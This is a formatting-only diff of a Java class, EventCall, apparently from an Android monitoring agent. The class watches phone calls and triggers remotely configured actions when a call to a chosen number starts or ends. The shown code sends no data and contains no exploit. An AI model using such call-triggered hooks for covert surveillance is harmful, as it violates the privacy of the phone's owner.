@@ -20,91 +20,95 @@ import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
 public class EventCall extends EventBase implements Observer<Call> {
-		/** The Constant TAG. */
-		private static final String TAG = "EventCall";
+	/** The Constant TAG. */
+	private static final String TAG = "EventCall";
 
-		private int actionOnExit, actionOnEnter;
-		private String number;
-		private boolean inCall = false;
-		
-		@Override
-		public void begin() {
-			ListenerCall.self().attach(this);
-		}
+	private int actionOnExit, actionOnEnter;
+	private String number;
+	private boolean inCall = false;
 
-		@Override
-		public void end() {
-			ListenerCall.self().detach(this);
-		}
+	@Override
+	public void begin() {
+		ListenerCall.self().attach(this);
+	}
 
-		@Override
-		public boolean parse(EventConf event) {
-			super.setEvent(event);
+	@Override
+	public void end() {
+		ListenerCall.self().detach(this);
+	}
 
-			final byte[] conf = event.getParams();
+	@Override
+	public boolean parse(EventConf event) {
+		super.setEvent(event);
 
-			final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-			
-			try {
-				actionOnEnter = event.getAction();
-				actionOnExit = databuffer.readInt();
-				
-				// Estraiamo il numero di telefono
-				byte[] num = new byte[databuffer.readInt()];
-				databuffer.read(num);
-				
-				number = WChar.getString(num, true);
-				
-				num = null;
-				if(Cfg.DEBUG) Check.log( TAG + " exitAction: " + actionOnExit + " number: \"");
-			} catch (final IOException e) {
-				if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
-				return false;
+		final byte[] conf = event.getParams();
+
+		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
+
+		try {
+			actionOnEnter = event.getAction();
+			actionOnExit = databuffer.readInt();
+
+			// Estraiamo il numero di telefono
+			byte[] num = new byte[databuffer.readInt()];
+			databuffer.read(num);
+
+			number = WChar.getString(num, true);
+
+			num = null;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");
 			}
-			
-			return true;
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED");
+			}
+			return false;
 		}
 
-		@Override
-		public void go() {
-			// TODO Auto-generated method stub
-		}
+		return true;
+	}
 
-		public int notification(Call c) {
-			// Nel range
-			if (c.isOngoing() && inCall == false) {
-				// Match any number
-				if (number.length() == 0) {
-					inCall = true;
-					onEnter();
-					return 0;
-				}
-				
-				// Match a specific number
-				if (c.getNumber().contains(number)) {
-					inCall = true;
-					onEnter();
-					return 0;
-				}
-				
-				return 0;
-			} 
-			
-			if (c.isOngoing() == false && inCall == true) {
-				inCall = false;
-				
-				onExit();
+	@Override
+	public void go() {
+		// TODO Auto-generated method stub
+	}
+
+	public int notification(Call c) {
+		// Nel range
+		if (c.isOngoing() && inCall == false) {
+			// Match any number
+			if (number.length() == 0) {
+				inCall = true;
+				onEnter();
 				return 0;
 			}
-			
+
+			// Match a specific number
+			if (c.getNumber().contains(number)) {
+				inCall = true;
+				onEnter();
+				return 0;
+			}
+
 			return 0;
 		}
-		
-		public void onEnter() {
-			trigger(actionOnEnter);
+
+		if (c.isOngoing() == false && inCall == true) {
+			inCall = false;
+
+			onExit();
+			return 0;
 		}
 
-		public void onExit() {
-			trigger(actionOnExit);
-		}
+		return 0;
+	}
+
+	public void onEnter() {
+		trigger(actionOnEnter);
+	}
+
+	public void onExit() {
+		trigger(actionOnExit);
+	}
 }
